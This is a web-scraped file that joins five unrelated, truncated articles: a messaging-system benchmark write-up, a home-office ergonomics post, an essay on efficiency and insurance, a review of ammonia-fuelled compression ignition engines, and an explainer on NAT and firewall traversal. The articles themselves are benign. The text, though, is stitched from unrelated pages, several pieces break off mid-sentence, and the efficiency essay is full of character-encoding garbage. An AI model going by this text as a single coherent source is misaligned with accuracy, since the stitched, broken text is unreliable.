<p><strong>RabbitMQ</strong> is an open-source traditional messaging middleware that implements the AMQP messaging standard, catering to low-latency queuing use cases. RabbitMQ consists of a set of broker processes that host “exchanges” for publishing messages to and queues for consuming messages from. Availability and durability are properties of the various queue types offered. Classic queues offer the least availability guarantees. Classic mirrored queues replicate messages to other brokers and improve availability. Stronger durability is provided through the more recently introduced <a href="https://www.rabbitmq.com/quorum-queues.html" target="_blank" rel="noopener noreferrer">quorum queues</a> but at the <a href="https://www.rabbitmq.com/quorum-queues.html#use-cases" target="_blank" rel="noopener noreferrer">cost of performance</a>. Since this is a performance-oriented blog post, we restricted our evaluation to classic and mirrored queues.</p>
<h2 id="durability"><a id="durability"></a>Durability in distributed systems</h2>
<p>Single-node storage systems (e.g., RDBMS) depend on fsyncing writes to disk to ensure maximal durability. But in distributed systems, durability typically comes from replication, with multiple copies of the data that fail independently. Fsyncing data is just a way of reducing the impact of the failure when it does occur (e.g., fsyncing more often could lead to lower recovery time). Conversely, if enough replicas fail, a distributed system may be unusable regardless of fsync or not. Hence, whether we fsync or not is just a matter of what guarantees each system chooses to depend on for its replication design. While some depend closely on never losing data written to disk, thus requiring fsync on every write, others handle this scenario in their design.</p>
<p>Kafka’s replication protocol was carefully designed to ensure consistency and durability guarantees without the need for synchronous fsync by tracking what has been fsynced to the disk and what hasn’t. By assuming less, Kafka can handle a wider range of failures like filesystem-level corruptions or accidental disk de-provisioning and does not take for granted the correctness of data that is not known to be fsync’d. Kafka is also able to leverage the OS for batching writes to the disk for better performance.</p>
<p>We have not been able to ascertain categorically whether BookKeeper offers the same consistency guarantees without fsyncing each write—specifically, whether it can rely on replication for fault tolerance in the absence of synchronous disk persistence. This isn’t covered in the documentation or a write-up on the underlying replication algorithm. Based on our inspection and the fact that BookKeeper implements a grouped fsync algorithm, we believe it does rely on fsyncing on each write for its correctness, but we’d love to <a href="mailto:info@confluent.io" target="_blank" rel="noopener noreferrer">hear from folks</a> in the community who might know better if our conclusion is correct.</p>
<p>In any case, since this can be somewhat of a controversial topic, we’ve given results in both cases to ensure we are being as fair and complete as possible, though running Kafka with synchronous fsync is extremely uncommon and also unnecessary.</p>
<h2 id="benchmarking-framework"><a id="benchmarking-framework"></a>Benchmarking framework</h2>
<p>With any benchmark, one wonders what framework is being used and if it’s fair. To that end, we wanted to use the <a href="http://openmessaging.cloud/docs/benchmarks/" target="_blank" rel="noopener noreferrer">OpenMessaging Benchmark Framework</a> (OMB), originally authored, in large parts, by Pulsar contributors. OMB was a good starting point with basic workload specification, metrics collection/reporting for the test results, support for the three chosen messaging systems as well as a modular cloud deployment workflow tailored for each system. But of note, Kafka and RabbitMQ implementations did have some significant shortcomings that affected the fairness and reproducibility of these tests. The resulting benchmarking code including the fixes described in more detail below are available as <a href="https://github.com/confluentinc/openmessaging-benchmark" target="_blank" rel="noopener noreferrer">open source</a>.</p>
<h3 id="omb-framework"><a id="omb-framework"></a>Fixes to the OMB Framework</h3>
<p>We upgraded to Java 11 and Kafka 2.6, RabbitMQ 3.8.5, and Pulsar 2.6 (the latest releases at the time of writing). We significantly enhanced the monitoring capabilities across the three systems, with the Grafana/Prometheus monitoring stack, capturing metrics across messaging systems, JVM, Linux, disk, CPU, and network. This was critical for being able to not just report results but explain them. We have added support for producer-only tests and consumer-only tests with support for generating/draining backlogs, while also fixing an important bug with producer rate calculation when the number of topics is smaller than the number of producer workers.</p>
<h3 id="omb-kafka-driver"><a id="omb-kafka-driver"></a>Fixes to the OMB Kafka driver</h3>
<p>We fixed a critical bug in the Kafka driver that starved Kafka producers of TCP connections, bottlenecking on a single connection from each worker instance. The fix makes the Kafka numbers fair, compared to other systems—that is, all of them now use the same number of TCP connections to talk to their respective brokers. We also fixed a critical bug in the Kafka benchmark consumer driver, where offsets were being committed too frequently and synchronously causing degradation, whereas it was done asynchronously for other systems. We also tuned the Kafka consumer fetch size and replication threads to eliminate bottlenecks in message fetching at high throughputs and to configure the brokers equivalent to the other systems.</p>
<h3 id="omb-rabbitmq-driver"><a id="omb-rabbitmq-driver"></a>Fixes to the OMB RabbitMQ driver</h3>
<p>We enhanced RabbitMQ to use routing keys and configurable exchange types (<code>DIRECT</code> and <code>TOPIC</code> exchanges) and also fixed a bug in the RabbitMQ cluster setup deployment workflow. Routing keys were introduced to mimic the concept of partitions per …</p></div></div></div>

  <p><span>Written: 06 Aug 2020 by <i>Rachel Thomas</i></span></p><p>You weren’t expecting to spend 2020 working from home.  You can’t afford a fancy standing desk.  You don’t have a home office, or even much spare space, in your apartment. Your neck is getting a permanent crick from hunching over your laptop on the couch. While those of us who are able to work from home are privileged to have this option, we still don’t want to permanently damage our backs, necks, or arms from a bad ergonomic setup.</p>

<p>This is not a post for ergonomic aficionados (the setups I share could all be further optimized).  This is a post for folks who don’t know where to get started, have a limited budget, and are willing to try simple, scrappy approaches.  Key takeway: for 34 dollars (21 for a good mouse, and 13 for a cheap keyboard), as well as some household items, you can create an ergonomic setup like the one below. I will show many other options throughout the post, for both sitting and standing, as well as approaches you can easily assemble/disassemble (if you are using the family dinner table and need to clear it off each evening).</p>

<h2 id="damage">You can permanently damage your body with bad ergonomics</h2>

<p>You can permanently damage your back, neck, and wrists from working without an ergonomic setup. Almost two decades ago, my partner Jeremy suffered from repetitive stress injury due to working without an ergonomic setup.  At the time, his arms were paralyzed and he had to take months off from work.  Even now and after years filled with good ergonomics and yoga, this still impacts his life, severely limiting how much time he can spend in cars or on planes, and creating painful flare-ups. Please take this issue seriously.</p>

<h2 id="separate">Key advice: Have a separate keyboard and mouse</h2>

<p>The most important thing to know is that you want your screen approximately at eye height, and your elbows at approximately right angles to your torso as they type and use the mouse. This is the case whether you are sitting or standing. If you are using a laptop, this will be impossible with the built-in keyboard and trackpad (no matter how nice they are). It is essential to have a separate keyboard and mouse. If you only do one thing to address ergonomics, obtain a separate keyboard and mouse.</p>

<p>If you can’t afford an external monitor, no worries, you can just elevate your laptop. Over the years, I have used cardboard boxes, drinking glasses, bottles of soda, board games, and stacks of books to elevate my laptop. I will recommend some keyboards and mice that I like below, but anything is better than using the ones built into your laptop (since that forces you to keep your screen at the wrong height). For example, the picture in the intro is of a set-up I created while visiting a family member’s apartment in 2014, using books and a cardboard box to elevate my keyboard, mouse, and laptop to the appropriate heights.</p>

<figure>
  <img width="400" src="https://www.fast.ai/images/ergonomic5.jpg" alt="For the deep learning study group, I routinely used a brown cardboard box. Bonus: I could store everything in the box when we had the clear out of that room each night.">

</figure>

<p>Above is a picture from the deep learning study group, which meets 5 days a week, for 7 weeks, every time we run the deep learning course. I use a brown cardboard box to elevate my keyboard.  We have to clear out of that conference room each evening, and it is simple for me to put my items in the box.  This sort of solution could work if you don’t have a dedicated office space in your home, and need to be able to set up/take down your workstation regularly.</p>

<p>I rarely worked in coffee shops pre-pandemic (and never do now), but when I had to I would still try to create an ergonomic setup (and go to a coffeeshop where there was enough space!). Here, I’ve stacked my laptop on top of my rolled-up backpack. Ideally, my screen would be higher, but this is still better than having it at table level. Don’t let the perfect be the enemy of the good. Every step you take towards a more ergonomic setup is helpful.</p>

<figure>
  <img width="400" src="https://www.fast.ai/images/ergonomic2.jpg" alt="When working at a coffee shop (pre-pandemic), I brought an external keyboard and mouse, and used my rolled-up backpack to raise the height of my laptop screen ">

<h2 id="standing-desks">About standing desks</h2>

<p>If you have a regular desk (or even just a table) at home and want a standing desk, one option is to convert it using the <a href="https://alphacolin.com/ikea-standing-desk-for-22-dollars/">$22 standing desk approach</a>, which involves an Ikea side table and shelf. I had a previous job in which this was quite popular. Here is a photo of my work desk from that time.</p>

<figure>
  <img width="400" src="https://www.fast.ai/images/ergonomic3.jpg" alt="In a previous job, many of us set up $22 standing desks using Ikea side tables">
  
  <figcaption>In a previous job, many of us set up $22 standing desks using Ikea side tables</figcaption>
  
</figure>

<p>Standing on a hard floor can be difficult for your back. I have a GelPro mat, which I love.  If you can’t afford a GelPro mat, standing on a folded-up yoga mat works great too.</p>

<p>Note that standing desks are not a cure-all.  I’ve often seen people with expensive standing-desk converters (also known as desktop risers) that still have their monitor way too low.  Even if you have an external monitor and desktop riser, makes sure your monitor is at an appropriate height.  It is likely you will still need to stack it on top of something.  If you don’t like the aesthetics of using books or other household items, you can buy a monitor stand, <a href="https://www.kensington.com/p/products/ergonomic-desk-accessorries/laptop-risers-monitor-stands/kensington-smartfit-monitor-stand-plus-for-up-to-21-screens/">such as this one</a>.</p>

<p>Using a standing desk with poor posture is not very ergonomic, so be cognizant of when you start feeling fatigued.  I prefer to switch between standing and sitting throughout the day, as my energy fluctuates.</p>

<h2 id="budget-recs">Budget Recommendations</h2>

<p>My “budget recommendation” would be to get an <a href="https://www.newegg.com/p/0TP-005H-00095">Anker vertical mouse</a> for $21 and literally any keyboard. If you have to choose, I’ve found that having a good mouse is way more important than a good keyboard.  It is important that you get some keyboard though, so that you can elevate your laptop screen.  In the setup below, I’m using a lightweight travel keyboard that isn’t particularly ergonomic, but it works fine.</p>

<figure>
  <img width="400" src="https://www.fast.ai/images/ergonomic4.jpg" alt="The barista at this coffee shop kindly let me use 2 plastic tubs to prop up my laptop.">
  
  <figcaption>The barista at this coffee shop kindly let me use 2 plastic tubs to prop up my laptop.</figcaption>
  
</figure>

<p>I realize that at a time when many Americans do not have enough to eat, that you may not have 34 dollars to spare (21 dollars for a mouse and 13 dollars for a cheap keyboard). However, if this is an option for you, it is well worth the cost. If you permanently damage your back, neck, or arms, no amount of money may be enough to heal them later.</p>

<h2 id="products">Other products I like</h2>

<p>My favorite mouse is the <a href="https://www.newegg.com/Logitech-910-001799/p/24W-001B-00008">Logitech wireless trackball mouse</a>. I have also used and liked the <a href="https://www.newegg.com/p/0TP-005H-00095">Anker vertical mouse</a>.  For keyboards, I like <a href="https://www.newegg.com/p/12K-00XE-00002">Goldtouch</a> (I use an older version of this one) or the <a href="https://www.newegg.com/microsoft-natural-4000-b2m-00012-usb-wired/p/N82E16823109148">Microsoft Ergonomic Keyboard</a>. And if you are looking for a compact, lightweight travel keyboard, I like the <a href="https://www.iclever.com/products/BK03-Bluetooth-Portable-Keyboard">iClever foldup keyboard</a>.</p>

<p>As mentioned above, <a href="https://www.gelpro.com/">GelPro mats</a> are great if you are going to be standing, and a folded-up yoga mat is a cheaper alternative.</p>

<p>I have a <a href="https://www.therooststand.com/">Roost portable, lightweight laptop stand</a>, which is great, although I can’t use it since I switched from a Macbook Air to a Microsoft Surface Pro. None of the links in this post are affiliate links; I’m just recommending what I’ve personally used and like.</p>

<p>For more about home office set-ups, Jeremy recently posted a twitter thread about his preferred computer set-up (which includes some pricier options). It’s also worth noting that his desk has a small footprint, and fits in the corner of our living room.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><blockquote>â€˜Slow down, you move too fast <em>â€¦</em>â€™ <br>â€“ â€˜The 59th Street Bridge Song (Feelinâ€™ Groovy)â€™ (1966) by Paul Simon</blockquote>
<p><strong>We worship efficiency</strong>. Use less to get more. Same-day delivery. Multitask; text on one device while emailing on a second, and perhaps conversing on a third. Efficiency is seen as good. Inefficiency as wasteful.</p>
<p>Thereâ€™s a sound rationale for thinking this way. Economists teach us that increased efficiency is the major way to improve our standard of living. If your company gives you a pay rise without becoming more efficient, it will also have to raise its prices to make up the shortfall. If all companies do the same, everyone ends up running in place â€“ youâ€™ll need your higher wages to match the higher prices of the things you buy. So, if we want to make material progress, we must become more efficient. Streamlined supply chains, just-in-time deliveries and no slack in the workforce all serve to raise efficiency. Achieve this, and all our lives will get better and better, or so weâ€™re promised.</p>
<p>For automobile manufacturers, who wish to squeeze as many miles per gallon as possible out of their car designs, air resistance and the grab of the road are the enemies of efficiency. In the world of finance, it is at the point of exchange that most friction arises. Before money, the potato farmer had to use sacks of potatoes to trade for eggs and milk. As the British historian Niall Ferguson reminds us in his <a href="https://www.penguin.co.uk/books/178/178638/the-ascent-of-money/9780141990262.html">book</a> <em>The Ascent of Money</em> (2008), the invention of money went a long way toward reducing this inefficiency, and much that has happened in the financial world over the past 200 years can be seen as a continuation of that revolution.</p>
<p>Credit, for example, meant that you could go shopping for eggs and milk even without having the money right now. Financial markets have since taken this efficiency to another level. The creation of â€˜option marketsâ€™ means that you donâ€™t have to go to the trouble of buying a stock that youâ€™re going to be selling soon anyway. You can just promise to buy it, and then sell it at a price and date specified by the option contract. And then you can trade the option rather than the underlying stock.</p>
<p>Each of these developments and many others have made it easier to do oneâ€™s business without wasted time and energy â€“ without friction. Each has made economic transactions quicker and more efficient. Thatâ€™s obviously good in some ways. But the financial crisis of 2008 suggested that maybe there could be too much of a good thing. If mortgages and other loans hadnâ€™t been transformed into tradable assets (â€˜securitiesâ€™), then bankers might have taken the time to assess the credit-worthiness of each applicant. If people had to visit a bank to withdraw cash, they might spend less and save more. This is not mere speculation â€“ for instance, <a href="https://doi.org/10.1002/(SICI)1099-0771(199909)12:3%3c183::AID-BDM318%3e3.0.CO;2-F">research</a> <a href="https://doi.org/10.1016/0167-2681(80)90051-7">reviewed</a> by the Nobel Prize-winning economist Richard Thaler shows that people will pay more for an item with a credit card than with cash. Arguably, a little friction to slow us down would have enabled both institutions and individuals to make better financial decisions.</p>
<p>A decade ago, the American psychologist Adam Grant and I argued in a journal <a href="https://journals.sagepub.com/doi/full/10.1177/1745691610393523?url_ver=Z39.88-2003&amp;rfr_id=ori:rid:crossref.org&amp;rfr_dat=cr_pub%20%200pubmed">paper</a> that this â€˜too much of a good thingâ€™ phenomenon might be a general rule. Some motivation produces excellent performance; too much motivation produces choking. Some group collaboration produces cohesion and enhances productivity; too much of it leads to staleness. Some empathy enables you to understand what another person is going through; too much could prevent you from saying and doing hard things. Similarly, in my <a href="https://www.harpercollins.com/products/the-paradox-of-choice-barry-schwartz?variant=32207920234530">book</a> <em>The Paradox of Choice</em> (2004), I argued that, whereas a life with no freedom to choose is not worth living, a life with too much choice leads to paralysis, bad decisions and dissatisfaction. Finding the right amount â€“ what Aristotle called the â€˜meanâ€™ â€“ of motivation, collaboration, empathy, choice and many other aspects of life, including efficiency, is a key challenge we face, both as individuals and as a society.</p>
<p>To be better prepared next time, we need to learn to live less efficiently in the here and now</p>
<p>But finding the mean isnâ€™t easy. As the English poet William Blake observed in <em>The Marriage of Heaven and Hell</em> (1790-93): â€˜You never know what is enough unless you know what is more than enough.â€™</p>
<p><strong>If the financial crisis</strong> taught us that we had become too efficient with our transactions, what of the COVID-19 pandemic? Why hadnâ€™t we stockpiled key supplies and machines, built up hospital capacity, or ensured the robustness of our supply chains? The reason, of course, is that it would have been seen as inefficient and profit-robbing. Money spent on masks and gowns gathering dust in a warehouse could always be put to more â€˜productiveâ€™ use in the marketplace. Likewise, employing more people than needed under â€˜ordinaryâ€™ circumstances, or making products yourself rather than relying on international supply chains, would have been seen as inefficient. One lesson, then, is that to be better prepared next time, we need to learn to live less â€˜efficientlyâ€™ in the here and now.</p>
<p>Seen in this light, at least some inefficiency is like an insurance policy. Think about your own situation. Every year that you donâ€™t get into a car accident and your house doesnâ€™t burn down and you stay healthy, you could think to yourself that you have â€˜wastedâ€™ your money on various pointless insurance products, and that youâ€™d be financially better off without all those insurance premiums to pay.</p>
<p>Most of us donâ€™t like the sense that weâ€™re wasting money on insurance. We would rather be wearing that money, or eating it, or driving it. Some years ago, with a struggle, I convinced my ageing mother to supplement her basic health insurance policy with a more comprehensive insurance product. Her resources were modest and the policy wasnâ€™t cheap. The year went by and, happily, she had no serious medical conditions that required the use of the extra cover. When the time came to renew, my mother resisted, because, indeed, the money she spent the year before had been â€˜wastedâ€™. My reply, perhaps unduly snarky, was to suggest to her that maybe the next year she would get lucky, have a really serious illness, and get her moneyâ€™s worth out of her insurance.</p>
<p>Thankfully, in many domains, government regulations protect us from our desire for ever-greater personal financial efficiency by forcing us to have insurance. Laws require that our cars be insured, and mortgagers require the same for our homes. In the United States, â€˜Obamacareâ€™ (the Affordable Care Act enacted in 2010, designed to increase the number of US citizens covered by health insurance) essentially compelled people to have health insurance, until the Supreme Court challenged this aspect of the Act as unconstitutional. I suspect that many of us are underinsured in general, but the problem would be much worse without these various, state-imposed insurance requirements.</p>
<p>One way to think about insurance, however inefficient it might feel, is that it enables us to be resilient against shocks that could befall us from a world that is radically uncertain. And the world <em>is</em> radically uncertain. As the British economists John Kay and Mervyn King point out in their <a href="https://wwnorton.com/books/9781324004776">book</a> <em>Radical Uncertainty</em> (2020), efforts to quantify risk by attaching probabilities to various unlikely future states of the world are mostly science fiction. The world is much messier than a roulette wheel or a pair of dice.</p>
<p>A little bit of friction can forestall disaster when you encounter an icy road</p>
<p><strong>What should we do</strong> in the face of this radical uncertainty? When making decisions, instead of asking ourselves which option will give us the best results, we should be asking which option will give us good-enough results under the widest range of future states of the world. Instead of trying to maximise return on investment in our retirement account, we should be setting a financial goal and then choosing investments that will allow us to achieve that goal under the widest set of future financial circumstances. Instead of looking for the â€˜bestâ€™ job, we should be looking for a job that will be good enough â€“ satisfying enough â€“ as co-workers and managers come and go, and the future economy gyrates. Instead of choosing the best college to go to, we should be choosing a college that will be good enough, even with an obnoxious roommate and a boring Bio 1 teacher.</p>
<p>The term used to describe this approach to decision-making is <em>satisficing</em>. And satisficing with an eye toward a radically uncertain future might be called <em>robust satisficing</em>. Satisficing is a form of insurance â€“ insurance against financial meltdowns, global pandemics, nasty bosses, boring teachers and crappy roommates. Insurance can seem stodgy â€“ like the guy who wears a belt <em>and</em> suspenders. Perhaps we donâ€™t need both, but what happens if we have neither?</p>
<p>I think the real flaw in capitalism revealed by the 2008 financial crisis was its unbridled, single-minded pursuit of profit and efficiency. And perhaps the real flaw revealed in our lack of readiness for the 2019-20 pandemic was a manifestation of the same thing. Capitalism neednâ€™t be either unbridled or single-minded. It isnâ€™t in other societies with high standards of living, and it hasnâ€™t been at all points in history in the US. So perhaps itâ€™s time to rekindle certain social norms that serve to slow us down. For example, if people thought about their homes less as financial investments and more as places to live, full of the friction of kids, dogs, friends, neighbours and community, there might be less property speculation with an eye toward buying and selling houses merely for profit. If companies felt the friction of being caretakers of their communities, they might look differently at streamlining their operations by eliminating jobs.</p>
<p>Weâ€™d all like a car that gets 100 miles to a gallon. The forces of …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>The diesel engine, also known as the compression ignition (CI) engine, has been a workhorse of the modern energy economy for more than a hundred years.&nbsp;Its role in the coming sustainable energy economy will be determined by its ability to co-evolve with climate-friendly fuels.&nbsp;Two researchers from the National Institute of Advanced Industrial Science and Technology in Japan have now examined the fit between ammonia and the CI engine.&nbsp;</p><p>Pavlos Dimitriou and Rahat Javaid arrive at a two-part conclusion in their paper, “<a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://www.sciencedirect.com/science/article/abs/pii/S0360319920300124" target="_blank">A review of ammonia as a compression ignition engine fuel</a>,” published in January in the <em>International Journal of Hydrogen Energy</em>. Part one is good news: “Ammonia as a compression ignition fuel can be currently seen as a feasible solution.”&nbsp;Part two is a dose of qualifying reality: to manage emissions of N2O, NOx, and unburnt NH3, “aftertreatment systems are mandatory for the adaptation of this technology,” which means that ammonia-fueled CI engines are likely to be feasible “only for marine, power generation and possibly heavy-duty applications where no significant space constraints exist.”</p><p>The paper provides a detailed and readable account of efforts over the last eight decades to develop a viable version of an ammonia-fueled CI engine.&nbsp;The authors state that, “to the best of [their] knowledge, this is the first review approach focusing entirely on ammonia utilisation for compression ignition.”&nbsp;A major challenge confronted by the development efforts derives from ammonia’s “poor combustion characteristics … such as high autoignition temperature, low flame speed, narrow flammability limits and high heat of vaporization.” They continue, “successful ammonia compression ignition operation could only be observed for engine designs that featured extremely high compression ratios from 35:1 to 100:1.”</p><p>To address this challenge, most researchers resorted to the expedient of co-combustion.&nbsp;With the addition of fuels like diesel, biodiesel, and dimethyl ether, “the combustion of ammonia … is a realistic conception, as the secondary fuel, with lower Autoignition temperature, can be used to trigger the combustion of the mixture.”&nbsp;Different researchers have used a variety of fuel ratios under a variety of conditions.&nbsp;Ammonia ratios as high as 95% have been achieved, but numbers in the range of 40 to 80% are more prevalent in the literature. Hydrogen has been used successfully as the complementary fuel.&nbsp;This includes hydrogen derived from on-board ammonia cracking, but the authors of one study determined that “the introduction of pure hydrogen [from an off-board source] seems to be the most promising in terms of emissions reduction and engine performance enhancement.”</p><p>The dual-fuel approach opens the door to CI for ammonia, but another challenge soon arises: when ammonia is burned as a CI fuel, it tends to produce problematic levels of nitrogen oxides and unburned ammonia. To compound the issue, NOx tends to be a product of high combustion temperatures and unburned ammonia of low temperatures – and there is no “sweet spot” temperature where neither species is a problem.&nbsp;</p><p>Contemporary researchers are attacking this problem with two methods.&nbsp;The first is with advanced fuel injection techniques.&nbsp;By injecting fuel at several points during the engine’s compression stroke, with fine control of the fuel increments, it is possible to achieve “simultaneous reduction of N2O and NH3 emissions in ammonia dual-fuel engines.”&nbsp;The second method is exhaust after-treatment.&nbsp;Selective catalytic reduction (SCR) technologies have been found that can reduce both NOx and unburned ammonia to acceptable levels, a result furthered by “the effect of ammonia in NOx reduction as observed in the modern after-treatment systems.”</p><p>The authors’ conclusion that ammonia is unlikely to become a major fuel for passenger cars will not come as a surprise to most members of the ammonia energy community.&nbsp;Ships, of course, are a different story.</p><p>Engine manufacturer MAN Energy Solutions expects to bring its dual-fueled maritime engine to market in 2024. (An <em>Ammonia Energy</em> <a href="https://www.ammoniaenergy.org/articles/man-ammonia-engine-update/">update on the MAN ammonia engine</a> appeared in January.)&nbsp;Success in the maritime realm will certainly encourage development of engines scaled for off-grid and back-up power generation.&nbsp;For other transportation applications, long the near-exclusive province of internal combustion, CI might have its hands full fighting off electrification via battery and fuel cell.</p></div></div></div></div></div>]]>

<p>We covered a lot of ground in our post about <a href="https://tailscale.com/blog/how-tailscale-works/"><em>How Tailscale
Works</em></a>.  However, we glossed over how we can get through NATs
(Network Address Translators) and connect your devices directly to
each other, no matter what’s standing between them. Let’s talk about
that now!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-intro.png">
    
    
</figure>

<p>Let’s start with a simple problem: establishing a peer-to-peer
connection between two machines. In Tailscale’s case, we want to set
up a WireGuard® tunnel, but that doesn’t really matter. The
techniques we use are widely applicable and the work of many people
over decades. For example, <a href="https://webrtc.org/">WebRTC</a> uses this bag of tricks to
send peer-to-peer audio, video and data between web browsers. VoIP
phones and some video games use similar techniques, though not always
successfully.</p>
<p>We’ll be discussing these techniques generically, using Tailscale and
others for examples where appropriate. Let’s say you’re making your
own protocol and that you want NAT traversal. You need two things.</p>
<p>First, the protocol should be based on UDP. You <em>can</em> do NAT traversal
with TCP, but it adds another layer of complexity to an already quite
complex problem, and may even require kernel customizations depending
on how deep you want to go. We’re going to focus on UDP for the rest
of this article.</p>
<p>If you’re reaching for TCP because you want a stream-oriented
connection when the NAT traversal is done, consider using QUIC
instead. It builds on top of UDP, so we can focus on UDP for NAT
traversal and still have a nice stream protocol at the end.</p>
<p>Second, you need direct control over the network socket that’s sending
and receiving network packets. As a rule, you can’t take an existing
network library and make it traverse NATs, because you have to send
and receive extra packets that aren’t part of the “main” protocol
you’re trying to speak. Some protocols tightly integrate the NAT
traversal with the rest (e.g. WebRTC). But if you’re building your
own, it’s helpful to think of NAT traversal as a separate entity that
shares a socket with your main protocol. Both run in parallel, one
enabling the other.</p>

        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-deep-integration.png">
    
    
</figure>

<p>Direct socket access may be tough depending on your situation. One
workaround is to run a local proxy. Your protocol speaks to this
proxy, and the proxy does both NAT traversal and relaying of your
packets to the peer. This layer of indirection lets you benefit from
NAT traversal without altering your original program.</p>
<p>With prerequisites out of the way, let’s go through NAT traversal from
first principles. Our goal is to get UDP packets flowing
bidirectionally between two devices, so that our other protocol
(WireGuard, QUIC, WebRTC, …) can do something cool. There are two
obstacles to having this Just Work: stateful firewalls and NAT
devices.</p>
<h3 id="figuring-out-firewalls">Figuring out firewalls</h3>
<p>Stateful firewalls are the simpler of our two problems. In fact, most
NAT devices include a stateful firewall, so we need to solve this
subset before we can tackle NATs.</p>
<p>There are many incarnations to consider. Some you might recognize are
the Windows Defender firewall, Ubuntu’s ufw (using iptables/nftables),
BSD’s pf (also used by macOS) and AWS’s Security Groups. They’re all
very configurable, but the most common configuration allows all
“outbound” connections and blocks all “inbound” connections. There
might be a few handpicked exceptions, such as allowing inbound SSH.</p>
<p>But connections and “direction” are a figment of the protocol
designer’s imagination. On the wire, every connection ends up being
bidirectional; it’s all individual packets flying back and forth. How
does the firewall know what’s inbound and what’s outbound?</p>
<p>That’s where the stateful part comes in. Stateful firewalls remember
what packets they’ve seen in the past and can use that knowledge when
deciding what to do with new packets that show up.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-1a.png">
    
    
</figure>

<p>For UDP, the rule is very simple: the firewall allows an inbound UDP
packet if it previously saw a matching outbound packet. For example,
if our laptop firewall sees a UDP packet leaving the laptop from
<code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, it’ll make a note that incoming
packets from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code> are also fine. The
trusted side of the world clearly intended to communicate with
<code>7.7.7.7:5678</code>, so we should let them talk back.</p>
<p>(As an aside, some <em>very</em> relaxed firewalls might allow traffic from
anywhere back to <code>2.2.2.2:1234</code> once <code>2.2.2.2:1234</code> has communicated
with anyone. Such firewalls make our traversal job easier, but are
increasingly rare.)</p>
<h4 id="firewall-face-off">Firewall face-off</h4>
<p>This rule for UDP traffic is only a minor problem for us, as long as
all the firewalls on the path are “facing” the same way. That’s
usually the case when you’re communicating with a server on the
internet. Our only constraint is that the machine that’s <em>behind</em> the
firewall(s) must be the one initiating all connections. Nothing can
talk to it, unless it talks first.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-2.png">
    
    
</figure>

<p>This is fine, but not very interesting: we’ve reinvented client/server
communication, where the server makes itself easily reachable to
clients. In the VPN world, this leads to a hub-and-spoke topology: the
hub has no firewalls blocking access to it and the firewalled spokes
connect to the hub.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-3.png">
    
    
</figure>

<p>The problems start when two of our “clients” want to talk
directly. Now the firewalls are facing each other. According to the
rule we established above, this means both sides must go first, but
also that neither can go first, because the other side has to go
first!</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-4.png">
    
    
</figure>

<p>How do we get around this? One way would be to require users to
reconfigure one or both of the firewalls to “open a port” and allow
the other machine’s traffic. This is not very user friendly. It also
doesn’t scale to mesh networks like Tailscale, in which we expect the
peers to be moving around the internet with some regularity. And, of
course, in many cases you don’t have control over the firewalls: you
can’t reconfigure the router in your favorite coffee shop, or at the
airport. (At least, hopefully not!)</p>
<p>We need another option. One that doesn’t involve reconfiguring
firewalls.</p>
<h4 id="finessing-finicky-firewalls">Finessing finicky firewalls</h4>
<p>The trick is to carefully read the rule we established for our
stateful firewalls. For UDP, the rule is: <strong>packets must flow out
before packets can flow back in.</strong></p>
<p>However, nothing says the packets must be <em>related</em> to each other
beyond the IPs and ports lining up correctly. As long as <em>some</em> packet
flowed outwards with the right source and destination, any packet that
<em>looks like</em> a response will be allowed back in, even if the other
side never received your packet!</p>
<p>So, to traverse these multiple stateful firewalls, we need to share
some information to get underway: the peers have to know in advance
the <code>ip:port</code> their counterpart is using. One approach is to
statically configure each peer by hand, but this approach doesn’t
scale very far. To move beyond that, we built a <a href="https://tailscale.com/blog/how-tailscale-works/#the-control-plane-key-exchange-and-coordination">coordination
server</a> to keep the <code>ip:port</code> information synchronized in a
flexible, secure manner.</p>
<p>Then, the peers start sending UDP packets to each other. They must
expect some of these packets to get lost, so they can’t carry any
precious information unless you’re prepared to retransmit them. This
is generally true of UDP, but especially true here. We’re <em>going</em> to
lose some packets in this process.</p>
<p>Our laptop and workstation are now listening on fixed ports, so that
they both know exactly what <code>ip:port</code> to talk to. Let’s take a look at
what happens.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5a.png">
    
    
</figure>

<p>The laptop’s first packet, from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, goes
through the Windows Defender firewall and out to the internet. The
corporate firewall on the other end blocks the packet, since it has no
record of <code>7.7.7.7:5678</code> ever talking to <code>2.2.2.2:1234</code>. However,
Windows Defender now remembers that it should expect and allow
responses from <code>7.7.7.7:5678</code> to <code>2.2.2.2:1234</code>.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5b.png">
    
    
</figure>

<p>Next, the workstation’s first packet from <code>7.7.7.7:5678</code> to
<code>2.2.2.2:1234</code> goes through the corporate firewall and across the
internet. When it arrives at the laptop, Windows Defender thinks “ah,
a response to that outbound request I saw”, and lets the packet
through! Additionally, the corporate firewall now remembers that it
should expect responses from <code>2.2.2.2:1234</code> to <code>7.7.7.7:5678</code>, and
that those packets are also okay.</p>
<p>Encouraged by the receipt of a packet from the workstation, the laptop
sends another packet back. It goes through the Windows Defender
firewall, through the corporate firewall (because it’s a “response” to
a previously sent packet), and arrives at the workstation.</p>
<figure>
    
        <img src="https://tailscale.com/blog/how-nat-traversal-works/nat-firewalls-5c.png">
    
    
</figure>

<p>Success! We’ve established two-way communication through a pair of
firewalls that, at first glance, would have prevented it.</p>
<h4 id="creative-connectivity-caveats">Creative connectivity caveats</h4>
<p>It’s not always so easy. We’re relying on some indirect influence over
third-party systems, which requires careful handling. What do we need
to keep in mind when managing firewall-traversing connections?</p>
<p>Both endpoints must attempt communication at roughly the same time, so
that all the intermediate firewalls open up while both peers are still
